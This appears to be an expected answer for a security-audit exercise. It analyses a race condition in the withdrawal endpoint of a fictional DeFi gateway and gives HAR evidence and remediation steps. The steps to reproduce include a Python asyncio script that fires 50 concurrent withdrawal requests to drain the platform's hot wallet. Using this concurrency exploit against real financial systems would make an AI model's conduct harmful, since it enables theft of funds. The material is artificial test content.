# Expected Response

## System
- **Name:** NovaChain DeFi Staking Gateway
- **Domain:** Decentralized Finance (DeFi) / Web3 / Crypto-Asset Custody
- **Document version analysed:** 2.8.5 (FINAL) + implementation doc 4.4.1

---

## Priority Findings

### Finding 1 — TOCTOU Race Condition: Concurrent Withdrawals Drain Platform Hot Wallet (Pattern 8.1 — Race condition / concurrency gaps)
**Severity:** Critical / Financial Loss
**Affected endpoint:** `POST https://api.novachain.finance/api/v2/withdrawals/execute`
**Referenced in context:** Section 4.0 (RISK-DEFI-007), Section 6.0 (Node.js code), Section 7.1 (API contract), HAR trace

**Summary:**
The withdrawal handler (`withdrawalController.js`, Section 6.0) implements a three-step flow: (1) read balance, (2) broadcast blockchain transaction via Rust Signer (~200ms), (3) deduct balance from PostgreSQL. The database read at Step 1 does **not** use row-locking (`SELECT ... FOR UPDATE`). During the ~200ms window of the Rust Signer network call, Node.js yields the event loop and processes other incoming requests for the same account. Concurrent requests therefore all pass the balance check against the same, undeducted balance.

Additionally, the `X-Idempotency-Key` header is documented in Section 7.1 as `"currently unenforced by the backend"`, eliminating the standard safeguard against duplicate financial transactions.

**Evidence from HAR — timestamp clustering:**
Three requests are recorded with identical authentication tokens (`SIWE_ATTACKER_TOKEN_991...`) and identical payloads (`amount_usdc: 5000.00`):
- Request 1: `startedDateTime: 2026-04-09T14:30:15.011Z` → Response: `BROADCAST_SUCCESS`, `tx_hash: 0x1a2b3c4d...`
- Request 2: `startedDateTime: 2026-04-09T14:30:15.014Z` → Response: `BROADCAST_SUCCESS`, `tx_hash: 0x9f8e7d6c...`
- Request 3: `startedDateTime: 2026-04-09T14:30:15.018Z` → Response: `BROADCAST_SUCCESS`, `tx_hash: 0xabcdef12...`

**Critical observation:** The timestamps span only 7 milliseconds (`.011Z` → `.018Z`). All three requests are identical in payload and JWT, yet each received a distinct, unique Ethereum `tx_hash`. Three different `tx_hash` values for three identical requests proves three separate blockchain transactions were broadcast — three separate 5,000 USDC transfers from the Hot Wallet — before the balance deduction in PostgreSQL had executed for any of them.

The context states the attacker deposited 5,000 USDC and used 50 concurrent threads. The HAR shows 3 of those 50 requests; at 50 threads, the total drain would be 250,000 USDC from a 5,000 USDC deposit.

---

## Evidence Map

| Artifact location | Finding (TOCTOU Race) |
|---|---|
| Section 4.0 / RISK-DEFI-007 | Broadcast occurs before balance deduction — timing window documented |
| Section 6.0 code (line 109) | `SELECT usdc_balance ... WHERE account_id = $1` — no `FOR UPDATE` lock |
| Section 6.0 code (lines 125–129) | `await rustSigner.broadcastTransaction(...)` — 200ms async yield without lock |
| Section 6.0 code (lines 134–137) | `UPDATE users SET usdc_balance = usdc_balance - $1` — deduction only after broadcast |
| Section 7.1 API contract | `X-Idempotency-Key: (Optional, currently unenforced)` — duplicate protection absent |
| HAR timestamps | `.011Z`, `.014Z`, `.018Z` — 7ms cluster, programmatic concurrency |
| HAR auth tokens | All three identical: `SIWE_ATTACKER_TOKEN_991...` — same account, concurrent |
| HAR payloads | All three: `amount_usdc: 5000.00` — identical request |
| HAR tx_hash values | Three distinct hashes — three separate blockchain transactions confirmed |

---

## Steps to Reproduce

### Single withdrawal baseline (verify normal behavior)

**Step 1 — Establish account balance and single-request behavior**
```
POST https://api.novachain.finance/api/v2/withdrawals/execute
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.SIWE_ATTACKER_TOKEN_991...
Content-Type: application/json

{"amount_usdc": 5000.00, "network": "ETHEREUM_MAINNET"}
```
Expected single-request outcome: `200 OK`, `{"status": "BROADCAST_SUCCESS", "tx_hash": "0x..."}`. A subsequent identical request should return `400 Bad Request` (`{"error": "Insufficient USDC balance."}`).

**Secure idempotency probe:**
```
POST https://api.novachain.finance/api/v2/withdrawals/execute
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.SIWE_ATTACKER_TOKEN_991...
Content-Type: application/json
X-Idempotency-Key: 550e8400-e29b-41d4-a716-446655440001

{"amount_usdc": 5000.00, "network": "ETHEREUM_MAINNET"}
```
**Vulnerable outcome:** Server ignores `X-Idempotency-Key` (per Section 7.1 documentation) and processes the request again.

### Race condition concurrency strike

**Step 2 — Submit 50 concurrent identical POST requests within a single millisecond window**

Using Python asyncio or `parallel` tooling, fire 50 HTTP POST requests simultaneously:
```python
import asyncio, aiohttp

async def withdraw(session):
    return await session.post(
        "https://api.novachain.finance/api/v2/withdrawals/execute",
        headers={"Authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.SIWE_ATTACKER_TOKEN_991...",
                 "Content-Type": "application/json"},
        json={"amount_usdc": 5000.00, "network": "ETHEREUM_MAINNET"}
    )

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [withdraw(session) for _ in range(50)]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(await r.json())

asyncio.run(main())
```
**Vulnerable outcome (confirmed by HAR — 3 of 50 shown):**
- Multiple requests return `200 OK` with `BROADCAST_SUCCESS`
- Each response contains a **different, unique `tx_hash`** (not the same hash repeated) — this is the definitive confirmation that each request triggered a separate blockchain transaction
- The `startedDateTime` values of successful responses will be within a 7–15ms window
- The account's PostgreSQL `usdc_balance` will be driven deeply negative in the `users` table

**Secure outcome:**
- Only the first request returns `200 OK`; all subsequent concurrent requests return `400 Bad Request` — `{"error": "Insufficient USDC balance."}` — because the row was locked by `SELECT ... FOR UPDATE`
- Or: only one `tx_hash` is returned; all others return `409 Conflict` referencing the idempotency key

**Step 3 — Verify blockchain drain**
Check the on-chain transaction history for the Hot Wallet address on the Ethereum Mainnet. If the attack succeeded, multiple outbound USDC ERC-20 transfer events will appear within the same block or consecutive blocks, all with the same destination address (the attacker's `eth_wallet_address` from their JWT).

---

## Remediation

1. **Add database row locking** — replace the balance-check query with `SELECT usdc_balance FROM users WHERE account_id = $1 FOR UPDATE`. This ensures only one transaction can hold the lock at a time; all others block until the balance is updated.

2. **Enforce `X-Idempotency-Key`** — generate a server-side idempotency key tied to `account_id + amount_usdc + timestamp-window`. If an identical request is received within a 10-second window, return `409 Conflict` referencing the original `tx_hash`.

3. **Invert the transaction order** — deduct the balance in PostgreSQL (within a database transaction) *before* calling the Rust Signer. Only broadcast to the blockchain if the database deduction succeeded; roll back on broadcast failure. This is the Check-Execute-Update → **Deduct-then-Broadcast** pattern.

4. **Per-account rate limiting** — apply a per-`account_id` rate limit (not just per-IP) to prevent the same user from sending more than 1 withdrawal request per 5 seconds, regardless of connection count.
